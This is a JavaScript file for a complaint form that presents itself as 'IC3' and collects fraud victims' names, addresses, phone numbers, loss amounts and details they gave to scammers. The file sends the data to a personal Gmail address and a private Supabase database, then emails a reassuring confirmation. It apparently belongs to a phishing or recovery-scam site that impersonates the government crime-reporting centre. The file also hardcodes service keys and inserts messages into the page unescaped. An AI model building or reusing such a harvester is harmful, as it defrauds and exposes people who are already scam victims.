/* ======================================================= */
/* Web3Forms AJAX — https://web3forms.com                  */
/* Toast notification system                               */
/* ======================================================= */

/* ---------------------------------------------------------
   Web3Forms access key is set in index.html:
   Key: defbd3b5-d292-4e6d-9be4-9d84b92b9674
   Delivers to: icintertinecomplaint@gmail.com
   --------------------------------------------------------- */

var WEB3FORMS_ENDPOINT = "https://api.web3forms.com/submit";
var ADMIN_EMAIL        = "icintertinecomplaint@gmail.com";

const SUPABASE_URL = "https://hmfuppjdagkufqzwsbrr.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhtZnVwcGpkYWdrdWZxendzYnJyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMwMTkzMTgsImV4cCI6MjA5ODU5NTMxOH0.nkrwlF_v_6HFFn89UGCbova_Zfo69GvN3TJbmMxF3Cg";
const supabaseClient = window.supabase ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;


/* ======================================================= */
/* TOAST NOTIFICATION SYSTEM                               */
/* ======================================================= */

function showToast(message, type) {
  type = type || "success";

  var container = document.getElementById("toast-container");
  if (!container) {
    container = document.createElement("div");
    container.id = "toast-container";
    document.body.appendChild(container);
  }

  var toast = document.createElement("div");
  toast.className = "toast toast-" + type;

  var icon = type === "error" ? "\u2717" : type === "info" ? "\u2139" : "\u2713";

  toast.innerHTML =
    '<div class="toast-content">' +
      '<span class="toast-icon">' + icon + '</span>' +
      '<span class="toast-message">' + message + '</span>' +
    '</div>' +
    '<div class="toast-progress"></div>';

  container.appendChild(toast);

  setTimeout(function () { toast.classList.add("show"); }, 10);

  setTimeout(function () {
    toast.classList.add("toast-fade-out");
    toast.classList.remove("show");
    toast.addEventListener("transitionend", function () {
      if (toast.parentNode) toast.remove();
    }, { once: true });
  }, 5000);
}


/* ======================================================= */
/* FORM SUBMISSION HANDLER                                 */
/* ======================================================= */

document.addEventListener("DOMContentLoaded", function () {

  /* ======================================================= */
  /* MOBILE NAVIGATION TOGGLE (HAMBURGER MENU)               */
  /* ======================================================= */
  var menuToggle = document.getElementById("menuToggle");
  var navLinks   = document.getElementById("navLinks");

  if (menuToggle && navLinks) {
    menuToggle.addEventListener("click", function (e) {
      e.stopPropagation();
      menuToggle.classList.toggle("active");
      navLinks.classList.toggle("active");
    });

    // Close menu when clicking links
    var links = navLinks.querySelectorAll("a");
    links.forEach(function (link) {
      link.addEventListener("click", function () {
        menuToggle.classList.remove("active");
        navLinks.classList.remove("active");
      });
    });

    // Close menu when clicking anywhere outside
    document.addEventListener("click", function (e) {
      if (!navLinks.contains(e.target) && !menuToggle.contains(e.target)) {
        menuToggle.classList.remove("active");
        navLinks.classList.remove("active");
      }
    });
  }

  var form  = document.getElementById("complaintForm");
  var msgEl = document.getElementById("successMessage");

  if (!form)  { console.error("complaintForm not found");  return; }
  if (!msgEl) { console.error("successMessage not found"); return; }

  form.addEventListener("submit", async function (e) {
    e.preventDefault();
    e.stopPropagation();

    var submitBtn = form.querySelector('[type="submit"]');
    if (submitBtn) submitBtn.disabled = true;

    msgEl.style.color = "orange";
    msgEl.innerText   = "Submitting, please wait\u2026";
    showToast("Submitting your complaint, please wait\u2026", "info");

    /* --- Collect all form values (including hidden Web3Forms fields) --- */
    var fd = new FormData(form);

    /* Capture the "affected" radio button (not auto-captured by FormData radio groups) */
    var affectedEl = form.querySelector('[name="affected"]:checked');
    if (affectedEl) {
      fd.set("affected", affectedEl.value);
    } else {
      fd.set("affected", "Not specified");
    }

    /* Convert FormData to plain JSON object */
    var payload = {};
    fd.forEach(function (value, key) {
      /* Skip file inputs — Web3Forms free tier doesn't handle attachments */
      if (value instanceof File) return;
      payload[key] = value;
    });

    /* Build a readable email body from all the fields */
    payload.message = buildEmailBody(payload);

    /* Ensure the from_name field is set */
    payload.from_name = payload.fullname || "IC3 Complaint Form";

    try {
      // 1. Send via Web3Forms (if still desired, though we now have Edge Functions. We will keep it for backwards compatibility)
      var response = await fetch(WEB3FORMS_ENDPOINT, {
        method:  "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept":        "application/json"
        },
        body: JSON.stringify(payload)
      });
      var result = await response.json();

      // 2. Save to Supabase Database
      if (supabaseClient) {
        const { error: dbError } = await supabaseClient.from('complaints').insert([
          {
            fullname: payload.fullname,
            email: payload.email,
            phone: payload.phone,
            businessName: payload.businessName,
            gender: payload.gender,
            affected: payload.affected,
            country: payload.country,
            state: payload.state,
            city: payload.city,
            address: payload.address,
            zipcode: payload.zipcode,
            category: payload.category,
            scammethod: payload.scammethod,
            timesscammed: payload.timesscammed,
            timespaid: payload.timespaid,
            lossamount: payload.lossamount,
            scammerhandle: payload.scammerhandle,
            datepaymentmade: payload.datepaymentmade,
            personalinfosent: payload.personalinfosent
          }
        ]);
        if (dbError) console.error("Error saving to Supabase:", dbError);
      }

      // 3. Trigger Confirmation Email via Edge Function
      if (supabaseClient && payload.email) {
        supabaseClient.functions.invoke("send-email", {
          body: {
            subject: "Confirmation: Complaint Received",
            htmlBody: `<p>Dear ${payload.fullname},</p><p>We have successfully received your complaint regarding <b>${payload.category}</b>. Our team will review it and get back to you shortly.</p><p>Best regards,<br>IC3 Complaints Team</p>`,
            toEmail: payload.email
          }
        }).catch(err => console.error("Error sending confirmation email:", err));
      }

      if (response.ok && result.success) {
        /* ---- SUCCESS ---- */
        msgEl.style.color = "green";
        msgEl.innerText   = "Complaint submitted successfully! You will receive a confirmation shortly.";
        showToast("Complaint submitted successfully!", "success");
        form.reset();

      } else {
        /* ---- API-LEVEL FAILURE ---- */
        var errMsg = result.message || "Submission failed. Please check your access key.";
        msgEl.style.color = "red";
        msgEl.innerText   = errMsg;
        showToast(errMsg, "error");
        console.error("Web3Forms error:", result);
      }

    } catch (error) {

      /* ---- NETWORK FAILURE ---- */
      var netMsg = "Network error — please check your internet connection and try again.";
      console.error("Submission error:", error);
      msgEl.style.color = "red";
      msgEl.innerText   = netMsg;
      showToast(netMsg, "error");

    } finally {
      if (submitBtn) submitBtn.disabled = false;
    }

  });

});


/* ======================================================= */
/* BUILD READABLE EMAIL BODY                               */
/* ======================================================= */

function buildEmailBody(d) {
  var lines = [
    "=== PERSONAL INFORMATION ===",
    "Full Name:          " + (d.fullname       || "-"),
    "Email:              " + (d.email          || "-"),
    "Phone:              " + (d.phone          || "-"),
    "Business Name:      " + (d.businessName   || "-"),
    "Gender:             " + (d.gender         || "-"),
    "Affected (Y/N):     " + (d.affected       || "-"),
    "",
    "=== LOCATION ===",
    "Country:            " + (d.country        || "-"),
    "State:              " + (d.state          || "-"),
    "City:               " + (d.city           || "-"),
    "Address:            " + (d.address        || "-"),
    "Zip Code:           " + (d.zipcode        || "-"),
    "",
    "=== COMPLAINT DETAILS ===",
    "Category:           " + (d.category       || "-"),
    "How scammed:        " + (d.scammethod     || "-"),
    "Times scammed:      " + (d.timesscammed   || "-"),
    "Payments sent:      " + (d.timespaid      || "-"),
    "Total loss amount:  " + (d.lossamount     || "-"),
    "Scammer handle:     " + (d.scammerhandle  || "-"),
    "Date payment made:  " + (d.datepaymentmade|| "-"),
    "",
    "=== ADDITIONAL INFORMATION ===",
    "Personal info sent to scammer:",
    (d.personalinfosent || "-"),
  ];

  return lines.join("\n");
}
